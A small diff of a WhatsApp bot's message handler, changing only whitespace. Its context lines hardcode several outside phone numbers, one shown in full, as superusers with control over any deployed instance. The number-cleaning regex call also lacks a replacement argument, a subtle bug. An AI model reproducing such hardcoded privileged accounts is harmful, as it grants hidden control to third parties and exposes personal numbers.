@@ -140,7 +140,7 @@ setTimeout(() => {
             
            /* if(origineMessage === "120363244435092946@g.us") return */
             
-              const verifGroupe = origineMessage?.endsWith("@g.us");
+            const verifGroupe = origineMessage?.endsWith("@g.us");
             var infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage) : "";
             var nomGroupe = verifGroupe ? infosGroupe.subject : "";
             var msgRepondu = ms.message.extendedTextMessage?.contextInfo?.quotedMessage;
@@ -163,7 +163,7 @@ setTimeout(() => {
             const k4 = '254751284190';
             const sudo = await getAllSudoNumbers();
            /* let suhail_ser = "923184474176"*/
-            const superUserNumbers = [servBot,/*suhail_ser,*/ k1, k2, k3, k4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            const superUserNumbers = [servBot, /*suhail_ser,*/ k1, k2, k3, k4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
